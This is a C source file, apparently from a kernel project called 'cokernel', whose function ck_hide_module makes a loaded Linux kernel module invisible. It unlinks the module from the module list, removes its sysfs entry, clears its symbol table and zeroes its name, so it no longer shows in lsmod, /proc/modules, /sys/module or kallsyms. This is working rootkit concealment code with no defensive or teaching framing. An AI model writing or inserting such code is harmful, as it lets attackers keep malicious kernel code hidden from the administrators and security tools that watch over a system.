/* SPDX-License-Identifier: GPL-2.0 */
/*
 * stealth.c — Module self-hiding
 *
 * Removes the module from all kernel data structures that expose
 * loaded modules to userspace:
 *
 *   1. list_del(&THIS_MODULE->list)       → /proc/modules, lsmod
 *   2. kobject_del(&THIS_MODULE->mkobj)   → /sys/module/
 *   3. Zero out symbols table             → kallsyms
 *
 * After this, the module's code pages remain in memory (they're
 * allocated by the kernel module loader and never freed since
 * the module can't be found to be unloaded).
 */

#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/string.h>

#include "stealth.h"

void ck_hide_module(void)
{
    struct module *mod = THIS_MODULE;

    if (!mod) {
        pr_warn("cokernel: THIS_MODULE is NULL, cannot hide\n");
        return;
    }

    /*
     * Step 1: Remove from the global modules list.
     * This hides us from /proc/modules and lsmod.
     */
    list_del_init(&mod->list);

    /*
     * Step 2: Remove from sysfs (/sys/module/<name>/).
     * The module's kobject is embedded in mkobj.kobj.
     */
    kobject_del(&mod->mkobj.kobj);

    /*
     * Step 3: Clear the symbol table pointer.
     * This prevents kallsyms from listing our symbols.
     */
    mod->syms = NULL;
    mod->num_syms = 0;

    /*
     * Step 4: Clear the module name to prevent string searches.
     */
    memset(mod->name, 0, MODULE_NAME_LEN);

    pr_info("cokernel: module hidden from all structures\n");
}
